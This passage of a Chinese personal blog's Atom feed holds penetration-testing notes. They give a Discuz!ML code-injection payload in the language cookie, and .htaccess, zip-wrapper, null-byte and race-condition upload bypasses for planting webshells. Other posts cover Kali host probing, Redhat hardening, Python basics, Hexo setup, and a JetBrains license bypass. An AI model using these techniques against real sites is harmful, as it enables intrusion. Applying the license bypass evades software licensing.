id="复现"><a href="#复现" class="headerlink" title="#复现"></a>#复现</h3><p>抓包并在在language参数处’.phpinfo().’</p><h3 id="参考"><a href="#参考" class="headerlink" title="#参考"></a>#参考</h3><p>Discuz!ML 3.x任意代码执行漏洞之大佬分析之后我分析<br><a href="https://www.freebuf.com/vuls/208457.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/208457.html</a><br>Discuz！ML V3.X代码注入复现与原理分析<br><a href="https://museljh.github.io/2019/07/15/Discuz!ML%20V3.X%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://museljh.github.io/2019/07/15/Discuz!ML%20V3.X%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</a><br>Discuz!ML V3.X 代码注入分析<br><a href="https://mp.weixin.qq.com/s/5Zl3Jve4eblNIXh30t469w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/5Zl3Jve4eblNIXh30t469w</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;漏洞综述&quot;&gt;&lt;a href=&quot;#漏洞综述&quot; class=&quot;headerlink&quot; title=&quot;#漏洞综述&quot;&gt;&lt;/a&gt;#漏洞综述&lt;/h3&gt;&lt;p&gt;漏洞类型：代码执行漏洞&lt;br&gt;影响系统及版本：Discuz!ML V3.2-3.4&lt;br&gt;漏洞原因：Discuz!ML 系统对cookie中的l接收的language参数内容未过滤，导致字符串拼接，从而执行php代码。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>上传限制绕过</title>
+    <link href="http://yoursite.com/2020/02/04/%E4%B8%8A%E4%BC%A0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/"/>
+    <id>http://yoursite.com/2020/02/04/上传限制绕过/</id>
+    <published>2020-02-04T05:08:00.000Z</published>
+    <updated>2020-02-04T05:09:51.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="htaccess文件突破黑名单（上传格式限制）"><a href="#htaccess文件突破黑名单（上传格式限制）" class="headerlink" title="#.htaccess文件突破黑名单（上传格式限制）"></a>#.htaccess文件突破黑名单（上传格式限制）</h3><p>1.自定义.htaccess上传</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FileMatch “test.jpg”&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FileMatch&gt;</span><br></pre></td></tr></table></figure><p>2.同目录下上传保存为jpg格式的一句话，成功绕过限制</p><a id="more"></a><h3 id="php流封装绕过截断"><a href="#php流封装绕过截断" class="headerlink" title="#php流封装绕过截断"></a>#php流封装绕过截断</h3><p>例：设文件包含代码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a &#x3D; $_GET[&#39;file&#39;]; </span><br><span class="line">include $a.&#39;.html.php&#39;;</span><br></pre></td></tr></table></figure><p>％00无法截断，只能包含xxxx.html.php<br>1.新建一个hello.html.php，内容为phpinfo（）;<br>2.压缩成zip<br>3.访问网址[<a href="http://localhost/test/blog.php?file=zip://test.zip%23hello],成功包含压缩文件内的hello.html.php" target="_blank" rel="noopener">http://localhost/test/blog.php?file=zip://test.zip%23hello],成功包含压缩文件内的hello.html.php</a></p><h3 id="0x00截断"><a href="#0x00截断" class="headerlink" title="#0x00截断"></a>#0x00截断</h3><p>0x00截断，00截断是将上传文件名或路径名中使用ascll码值为0的字符（也就是null）来进行截断<br>1.BP抓包<br>2.在/Upload/后面加一个空格，点开hex，将其对应的20改成00即可，就可以绕过后缀名的过滤，从而得到webshell</p><h3 id="00截断"><a href="#00截断" class="headerlink" title="#%00截断"></a>#%00截断</h3><p>%00一般用在URL中用于截断url来进行文件包含<br>1.BP抓包<br>2.在filename后面加%00.jpg，先绕过后缀上传，然后利用burp的urldecode功能，其实和/00截断将hex20变成00一样，效果一样，两种方法都可以拿webshell</p><h3 id="竞争上传"><a href="#竞争上传" class="headerlink" title="#竞争上传"></a>#竞争上传</h3><p>1.上传一个包含创建webshell的脚本，在文件解压到被删除到时间差内访问webshell<br>2.构造压缩文件，成功解压部分文件，在解压未未完成时出错，不执行删除程序<br>a)上传含<code>png</code>，<code>php</code>文件的压缩包，在上传时抓包。使用”Paste from file“将压缩包放入请求数据包中，并修改最后一个PHP文件的hex值=&gt;成功解压部分并查看被解压的目录<br>b)发现未指定解压目录，构造含有<code>png</code>，<code>php</code>文件的压缩包，用notepad++将<code>xxx.php</code>修改为<code>../xxx.php</code>，通过BP上传，成功在上级目录下创建一个<code>xxx.php</code></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;htaccess文件突破黑名单（上传格式限制）&quot;&gt;&lt;a href=&quot;#htaccess文件突破黑名单（上传格式限制）&quot; class=&quot;headerlink&quot; title=&quot;#.htaccess文件突破黑名单（上传格式限制）&quot;&gt;&lt;/a&gt;#.htaccess文件突破黑名单（上传格式限制）&lt;/h3&gt;&lt;p&gt;1.自定义.htaccess上传&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;FileMatch “test.jpg”&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SetHandler application&amp;#x2F;x-httpd-php&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;&amp;#x2F;FileMatch&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;2.同目录下上传保存为jpg格式的一句话，成功绕过限制&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Redhat基础测试</title>
+    <link href="http://yoursite.com/2020/02/04/Redhat%E5%9F%BA%E7%A1%80%E6%B5%8B%E8%AF%95/"/>
+    <id>http://yoursite.com/2020/02/04/Redhat基础测试/</id>
+    <published>2020-02-04T05:02:00.000Z</published>
+    <updated>2020-02-04T09:34:54.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="安装"><a href="#安装" class="headerlink" title="#安装"></a>#安装</h3><p>镜像地址：<br>ed2k://|file|[红帽企业Linux.6.4.服务器版].rhel-server-6.4-x86_64-dvd[ED2000.COM].iso|3720347648|542c0277eff8b86b7f0c18358df84702|h=hzclqmdk4re2o4pi5hzr5hpvnu5o4iij|/<br>（复制到迅雷打开）<br>PS. 用VMware安装时，显示网络连接错误，将虚拟机选项中的网络适配器选择为桥接模式</p><a id="more"></a><h3 id="口令安全"><a href="#口令安全" class="headerlink" title="#口令安全"></a>#口令安全</h3><p>1.编辑<code>/etc/login.defs</code> 修改<code>PASS_MIN_LEN</code>参数（最小口令长度） 具体修改代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su - （提升权限）</span><br><span class="line">vim &#x2F;etc&#x2F;login.defs</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-202.png" alt="upload successful"><br>2.编辑<code>/etc/pam.d/system-auth</code> 修改password requisite pam_cracklib.so try_first_pass<br>local-only retry authok_type中的<code>retry</code>参数值(错误登录锁定次数)<br><img src="/images/pasted-204.png" alt="upload successful"><br>3.<br><img src="/images/pasted-206.png" alt="upload successful"><br>4.<br><img src="/images/pasted-207.png" alt="upload successful"><br>5.<br><img src="/images/pasted-208.png" alt="upload successful"><br><img src="/images/pasted-209.png" alt="upload successful"><br>具体修改代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">passwd -f gdm</span><br><span class="line">New password：</span><br><span class="line">Retype new password：&#x2F;&#x2F;重复俩次输入密码</span><br></pre></td></tr></table></figure><h3 id="账户安全"><a href="#账户安全" class="headerlink" title="#账户安全"></a>#账户安全</h3><p>1.<br><img src="/images/pasted-210.png" alt="upload successful"><br>2.<br><img src="/images/pasted-211.png" alt="upload successful"><br>3.<br><img src="/images/pasted-212.png" alt="upload successful"></p><h3 id="用户账户安全设置"><a href="#用户账户安全设置" class="headerlink" title="#用户账户安全设置"></a>#用户账户安全设置</h3><p>1.<br><img src="/images/pasted-213.png" alt="upload successful"><br>2.<br><img src="/images/pasted-214.png" alt="upload successful"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;#安装&quot;&gt;&lt;/a&gt;#安装&lt;/h3&gt;&lt;p&gt;镜像地址：&lt;br&gt;ed2k://|file|[红帽企业Linux.6.4.服务器版].rhel-server-6.4-x86_64-dvd[ED2000.COM].iso|3720347648|542c0277eff8b86b7f0c18358df84702|h=hzclqmdk4re2o4pi5hzr5hpvnu5o4iij|/&lt;br&gt;（复制到迅雷打开）&lt;br&gt;PS. 用VMware安装时，显示网络连接错误，将虚拟机选项中的网络适配器选择为桥接模式&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Kali入门</title>
+    <link href="http://yoursite.com/2020/02/04/Kali%E5%85%A5%E9%97%A8/"/>
+    <id>http://yoursite.com/2020/02/04/Kali入门/</id>
+    <published>2020-02-04T04:59:00.000Z</published>
+    <updated>2020-02-04T05:01:06.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="主机探测"><a href="#主机探测" class="headerlink" title="#主机探测"></a>#主机探测</h3><p>1.1 ping检查主机是否在线<br>例：<code>ping -c 5 -s 2000 192.168.1.3</code> 发送五个大小为2000的字节包到目标主机<br>1.2 arping测试特定IP在网络中是否在线<br>例：<code>arping -c 5 192.168.1.3</code>发送四个ping数据包到目标主机</p><a id="more"></a><p>1.3 hping发送数据并监听返回数据包<br>例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hping3#进入TCL脚本交互式界面</span><br><span class="line">hping send &#123;ip(daddr&#x3D;192.168.1.3)+icmp(type&#x3D;0,code&#x3D;0)&#125;#向目标主机发送一个icmp echo requset请求数据包</span><br><span class="line">hping recv ech0#用户监听返回的数据包</span><br></pre></td></tr></table></figure><p>1.4 nbtscan扫描ip地址获取目标NetBIOS名字信息<br>例：<br><code>nbtscan 192.168.1.3</code> 获取目标NetBIOS名字信息<br><code>nbtscan -hv 192.168.1.3</code> 查看目标主机运行服务<br>1.5 nping 支持多协议并允许用户设置设置网络报文格式的探测工具<br>例：<code>nping -c 2 -p 80 --flags syn 192.168.1.3</code> 向目标主机80端口发送2个带SYN标志的TCP数据包</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;主机探测&quot;&gt;&lt;a href=&quot;#主机探测&quot; class=&quot;headerlink&quot; title=&quot;#主机探测&quot;&gt;&lt;/a&gt;#主机探测&lt;/h3&gt;&lt;p&gt;1.1 ping检查主机是否在线&lt;br&gt;例：&lt;code&gt;ping -c 5 -s 2000 192.168.1.3&lt;/code&gt; 发送五个大小为2000的字节包到目标主机&lt;br&gt;1.2 arping测试特定IP在网络中是否在线&lt;br&gt;例：&lt;code&gt;arping -c 5 192.168.1.3&lt;/code&gt;发送四个ping数据包到目标主机&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Pycharm/Phpstorm注册码</title>
+    <link href="http://yoursite.com/2020/02/04/Pycharm-Phpstorm%E6%B3%A8%E5%86%8C%E7%A0%81/"/>
+    <id>http://yoursite.com/2020/02/04/Pycharm-Phpstorm注册码/</id>
+    <published>2020-02-04T04:56:00.000Z</published>
+    <updated>2020-02-04T09:09:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="学生邮箱注册认证后可以免费使用一年"><a href="#学生邮箱注册认证后可以免费使用一年" class="headerlink" title="#学生邮箱注册认证后可以免费使用一年"></a>#学生邮箱注册认证后可以免费使用一年</h3><h3 id="注册码"><a href="#注册码" class="headerlink" title="#注册码"></a>#注册码</h3><p>访问网站[<a href="http://idea.lanyus.com/]复制注册码" target="_blank" rel="noopener">http://idea.lanyus.com/]复制注册码</a><br>将“0.0.0.0 account.jetbrains.com”添加到hosts文件中</p><a id="more"></a><p><img src="/images/pasted-191.png" alt="upload successful"><br><img src="/images/pasted-192.png" alt="upload successful"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;学生邮箱注册认证后可以免费使用一年&quot;&gt;&lt;a href=&quot;#学生邮箱注册认证后可以免费使用一年&quot; class=&quot;headerlink&quot; title=&quot;#学生邮箱注册认证后可以免费使用一年&quot;&gt;&lt;/a&gt;#学生邮箱注册认证后可以免费使用一年&lt;/h3&gt;&lt;h3 id=&quot;注册码&quot;&gt;&lt;a href=&quot;#注册码&quot; class=&quot;headerlink&quot; title=&quot;#注册码&quot;&gt;&lt;/a&gt;#注册码&lt;/h3&gt;&lt;p&gt;访问网站[&lt;a href=&quot;http://idea.lanyus.com/]复制注册码&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://idea.lanyus.com/]复制注册码&lt;/a&gt;&lt;br&gt;将“0.0.0.0 account.jetbrains.com”添加到hosts文件中&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="教程" scheme="http://yoursite.com/categories/%E6%95%99%E7%A8%8B/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Python(4)</title>
+    <link href="http://yoursite.com/2020/02/03/Python-4/"/>
+    <id>http://yoursite.com/2020/02/03/Python-4/</id>
+    <published>2020-02-03T03:14:00.000Z</published>
+    <updated>2020-02-04T04:56:21.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="#常用函数"></a>#常用函数</h3><p>*字符显示格式<br>title():以首字母大写的形式显示单词<br>upper():字符串全部大写<br>lower():字符串全部小写</p><a id="more"></a><p>删除空白<br>rstrip():删除开头空白<br>lstrip():删除末尾空白<br>strip():删除俩端空白<br>组织列表<br>append():将元素添加到列表末尾<br>insert():将元素添加到列表任意位置<code>例：insert(0,&#39;1111&#39;)</code><br>del():已知元素位置，删除 <code>例：del message[0]</code><br>pop():弹出，将元素从列表中删除但是可以另外使用<code>message.pop(0)</code><br>remove():已知元素值，删除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">例：</span><br><span class="line">message&#x3D;[&#39;1&#39;,&#39;2&#39;,&#39;3&#39;]</span><br><span class="line"></span><br><span class="line">message.remove(&#39;2&#39;)</span><br><span class="line">or</span><br><span class="line">number&#x3D;&#39;2&#39;</span><br><span class="line">message.remove(number)</span><br></pre></td></tr></table></figure><p>sort():按照字母顺序排序（永久）<code>例：car.sort() 正序``car.sort(reverse=True) 逆序</code><br>sorted()：按照字母顺序排序（临时）<br>reverse():反转列表元素的排列顺序（永久）<br>len():显示列表长度</p><p>*操作列表<br>range():创建数值列表 <code>例：range（1，5） 显示1，2，3，4/range（1，5，2） 显示1，3</code><br>复制列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">my&#x3D;[&#39;a&#39;,&#39;b&#39;,&#39;c&#39;]</span><br><span class="line">you&#x3D;my[:]</span><br></pre></td></tr></table></figure><p>set():剔除列表中的重复项<br>int():获取数值的输入</p><h3 id="概念"><a href="#概念" class="headerlink" title="#概念"></a>#概念</h3><p>列表&amp;元组&amp;字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">列表：</span><br><span class="line">message&#x3D;[&#39;1&#39;,&#39;2&#39;,&#39;3&#39;]</span><br><span class="line">print(message[0:1])</span><br><span class="line">&#x2F;&#x2F;输出结果为列表</span><br><span class="line">[&#39;1&#39;]</span><br><span class="line"></span><br><span class="line">元组：</span><br><span class="line">message&#x3D;(1,2,3)</span><br><span class="line">print(message[0])</span><br><span class="line">&#x2F;&#x2F;输出结果为数字</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">字典：</span><br><span class="line">message&#x3D;&#123;&#39;numeber_1&#39;:&#39;1&#39;,&#39;numeber_2&#39;:&#39;2&#39;,&#39;numeber_3&#39;:&#39;3&#39;&#125;</span><br><span class="line">print(message[&#39;number_1&#39;]</span><br><span class="line">&#x2F;&#x2F;输出结果为键number_1对于的键值1</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>通过字典存储个人信息，再将整体存储在列表中 用列表存储一些个人喜好的总和，再在字典中作为键值存储</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;常用函数&quot;&gt;&lt;a href=&quot;#常用函数&quot; class=&quot;headerlink&quot; title=&quot;#常用函数&quot;&gt;&lt;/a&gt;#常用函数&lt;/h3&gt;&lt;p&gt;*字符显示格式&lt;br&gt;title():以首字母大写的形式显示单词&lt;br&gt;upper():字符串全部大写&lt;br&gt;lower():字符串全部小写&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Python(3)</title>
+    <link href="http://yoursite.com/2020/02/03/Python-3/"/>
+    <id>http://yoursite.com/2020/02/03/Python-3/</id>
+    <published>2020-02-03T03:13:00.000Z</published>
+    <updated>2020-02-03T03:15:18.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="循环停止的三种方法"><a href="#循环停止的三种方法" class="headerlink" title="#循环停止的三种方法"></a>#循环停止的三种方法</h3><p>1）<code>while循环</code>中使用条件语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">str&#x3D;&quot;what&#39;s your name?:&quot;</span><br><span class="line">message&#x3D;&#39;&#39;</span><br><span class="line">while message !&#x3D; &#39;quit&#39;:</span><br><span class="line">    message&#x3D;input(str)</span><br><span class="line">    </span><br><span class="line">    if message !&#x3D;&#39;quit&#39;</span><br><span class="line">    print(message)</span><br></pre></td></tr></table></figure><a id="more"></a><p>2)使用<code>变量active</code>来控制循环的结束</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">str&#x3D;&quot;what&#39;s your name?:&quot;</span><br><span class="line">active&#x3D;True</span><br><span class="line">while active:</span><br><span class="line">    message&#x3D;input(str)</span><br><span class="line">    if message&#x3D;&#x3D;&#39;quit&#39;:</span><br><span class="line">        active&#x3D;False</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br></pre></td></tr></table></figure><p>3)使用<code>break</code>结束循环</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">str&#x3D;&quot;what&#39;s your name?:&quot;</span><br><span class="line">message&#x3D;&#39;&#39;</span><br><span class="line">while True:</span><br><span class="line">    message&#x3D;input(str)</span><br><span class="line">    if message &#x3D;&#x3D; &#39;quit&#39;:</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;循环停止的三种方法&quot;&gt;&lt;a href=&quot;#循环停止的三种方法&quot; class=&quot;headerlink&quot; title=&quot;#循环停止的三种方法&quot;&gt;&lt;/a&gt;#循环停止的三种方法&lt;/h3&gt;&lt;p&gt;1）&lt;code&gt;while循环&lt;/code&gt;中使用条件语句&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;str&amp;#x3D;&amp;quot;what&amp;#39;s your name?:&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;message&amp;#x3D;&amp;#39;&amp;#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;while message !&amp;#x3D; &amp;#39;quit&amp;#39;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    message&amp;#x3D;input(str)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if message !&amp;#x3D;&amp;#39;quit&amp;#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    print(message)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+    
+    </summary>
+    
+    
+      <category term="Pythom" scheme="http://yoursite.com/categories/Pythom/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Hexo的迁移（mac篇）</title>
+    <link href="http://yoursite.com/2020/02/03/Hexo%E7%9A%84%E8%BF%81%E7%A7%BB%EF%BC%88mac%E7%AF%87%EF%BC%89/"/>
+    <id>http://yoursite.com/2020/02/03/Hexo的迁移（mac篇）/</id>
+    <published>2020-02-03T03:03:00.000Z</published>
+    <updated>2020-02-04T09:07:30.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言：安装homebrew以及git（https-git-scm-com-）"><a href="#前言：安装homebrew以及git（https-git-scm-com-）" class="headerlink" title="#前言：安装homebrew以及git（https://git-scm.com/）"></a>#前言：安装homebrew以及git（<a href="https://git-scm.com/）" target="_blank" rel="noopener">https://git-scm.com/）</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;ruby -e &quot;$(curl -fsSL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Homebrew&#x2F;install&#x2F;master&#x2F;install)&quot;</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="安装node-js以及npm"><a href="#安装node-js以及npm" class="headerlink" title="#安装node.js以及npm"></a>#安装node.js以及npm</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew install node</span><br><span class="line">brew install npm</span><br></pre></td></tr></table></figure><h3 id="进入blog直接运行"><a href="#进入blog直接运行" class="headerlink" title="#进入blog直接运行"></a>#进入blog直接运行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>出现报错：<br><img src="/images/pasted-185.png" alt="upload successful"><br>尝试安装hexo-renderer-sass</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo npm install hexo-renderer-sass</span><br></pre></td></tr></table></figure><p>成功安装后依旧报错</p><h3 id="换源"><a href="#换源" class="headerlink" title="#换源"></a>#换源</h3><p>更换cnpm源 并尝试国内主流解决方案</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo npm i cnpm -g --registry&#x3D;http:&#x2F;&#x2F;registry.npm.taobao.org</span><br><span class="line">cnpm install node-sass@latest</span><br></pre></td></tr></table></figure><p>成功解决</p><h3 id="其他"><a href="#其他" class="headerlink" title="#其他"></a>#其他</h3><p><img src="/images/pasted-186.png" alt="upload successful"><br>问题的原因是node和hexo插件的版本…在node8.x的版本中，fs.SyncWriteStream被弃用<br>但是admin插件真的很好用（x 而且截图插入也很方便<br>所以依旧默默忍受着这行报错…</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;前言：安装homebrew以及git（https-git-scm-com-）&quot;&gt;&lt;a href=&quot;#前言：安装homebrew以及git（https-git-scm-com-）&quot; class=&quot;headerlink&quot; title=&quot;#前言：安装homebrew以及git（https://git-scm.com/）&quot;&gt;&lt;/a&gt;#前言：安装homebrew以及git（&lt;a href=&quot;https://git-scm.com/）&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://git-scm.com/）&lt;/a&gt;&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#x2F;usr&amp;#x2F;bin&amp;#x2F;ruby -e &amp;quot;$(curl -fsSL https:&amp;#x2F;&amp;#x2F;raw.githubusercontent.com&amp;#x2F;Homebrew&amp;#x2F;install&amp;#x2F;master&amp;#x2F;install)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+    
+    </summary>
+    
+    
+      <category term="教程" scheme="http://yoursite.com/categories/%E6%95%99%E7%A8%8B/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>pip以及pip3安装</title>
+    <link href="http://yoursite.com/2020/02/03/pip%E4%BB%A5%E5%8F%8Apip3%E5%AE%89%E8%A3%85/"/>
+    <id>http://yoursite.com/2020/02/03/pip以及pip3安装/</id>
+    <published>2020-02-03T02:46:00.000Z</published>
+    <updated>2020-02-04T09:07:04.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前提"><a href="#前提" class="headerlink" title="#前提"></a>#前提</h3><p>安装2.7和3.6的情况下 没有pip3</p><h3 id="调试（1）"><a href="#调试（1）" class="headerlink" title="#调试（1）"></a>#调试（1）</h3><p><code>brew reinstall python3 --with-brewed-openssl</code><br>然而下载完毕后pip3的版本过低 按照提示更新<br><code>sudo pip3 install --upgrade pip</code><br>然而满屏报错…</p><a id="more"></a><p>另一种方法附上<br><a href="https://pip.pypa.io/en/stable/installing/" target="_blank" rel="noopener">https://pip.pypa.io/en/stable/installing/</a></p><h3 id="调试（2）"><a href="#调试（2）" class="headerlink" title="#调试（2）"></a>#调试（2）</h3><p>卸载重装<br><code>brew uninstall python3</code><br><code>brew install python3</code><br>再次更新pip3<br><code>sudo -H pip3 install --upgrade pip</code><br>更新成功</p><h3 id="调试（3）"><a href="#调试（3）" class="headerlink" title="#调试（3）"></a>#调试（3）</h3><p><code>pip -V</code><br><code>pip3 -v</code><br>显示结果全部指向python3.6</p><p>修改pip指向：<br><code>which pip</code><br>回显 /usr/local/bin/pip<br><code>sudo vim /usr/local/bin/pip</code><br>将python后修改为2.7版本<br><img src="/images/pasted-183.png" alt="upload successful"><br>按esc后输入：wq保存</p><h3 id="结果"><a 